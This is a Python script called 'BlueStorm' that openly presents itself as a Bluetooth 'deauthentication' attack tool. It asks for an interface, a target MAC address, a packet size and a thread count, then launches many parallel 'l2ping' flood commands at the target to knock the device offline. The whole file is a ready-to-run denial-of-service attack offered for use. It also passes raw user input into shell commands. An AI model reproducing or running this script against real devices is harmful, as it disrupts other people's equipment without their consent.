# BlueStorm
# A tool which perform deauthentication attack on unpaired bluetooth devices.
# Author - WireBits

import os
import time
import threading

def bluetooth_deauthentication(bluetooth_interface, packet_size, target_address):
    os.system(f'l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}')

def logo():
    print("\t\t\t\t\t\t+-------------------------------+")
    print("\t\t\t\t\t\t|--╔╗ ╦  ╦ ╦╔═╗╔═╗╔╦╗╔═╗╦═╗╔╦╗--|")
    print("\t\t\t\t\t\t|--╠╩╗║  ║ ║║╣ ╚═╗ ║ ║ ║╠╦╝║║║--|")
    print("\t\t\t\t\t\t|--╚═╝╩═╝╚═╝╚═╝╚═╝ ╩ ╚═╝╩╚═╩ ╩--|")
    print("\t\t\t\t\t\t|Bluetooth Deauthentication Tool|")
    print("\t\t\t\t\t\t+-------------------------------+")
    print("\t\t\t\t\t\t|-------Author : WireBits-------|")
    print("\t\t\t\t\t\t+-------------------------------+")

def main():
    os.system('clear')
    logo()
    print("")

    try:
        bluetooth_interface = input('Bluetooth Interface (e.g. hci0) > ')
    except:
        print('[!] Bluetooth Interface not entered!')
        exit(0)
    
    targetMAC = input('Target ID or MAC Address > ')
    try:
        target_address = array[int(targetMAC)]
    except:
        target_address = targetMAC
    
    if len(target_address) < 1:
        print('[!] Target address not entered!')
        exit(0)
    
    try:
        packet_size = int(input('Packet Size (Max : 600) > '))
    except:
        print('[!] Packet size must be an integer!')
        exit(0)
    
    try:
        threads_count = int(input('Number of threads > '))
    except:
        print('[!] Number of threads must be an integer!')
        exit(0)
    
    print("")
    os.system('clear')
    
    for i in range(0, 3):
        countdown_message = f"[*] Starting deauthentication attack in {3 - i} seconds..."
        print(countdown_message, end='\r')
        time.sleep(1)
    os.system('clear')
    
    print('[*] Building threads...')
    
    for i in range(0, threads_count):
        threading.Thread(target=bluetooth_deauthentication, args=[str(bluetooth_interface), str(packet_size), str(target_address)]).start()
    
    print('[*] Threads builded!')
    print('[*] Attack Started!')

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        print('[*] Aborted!')
        exit(0)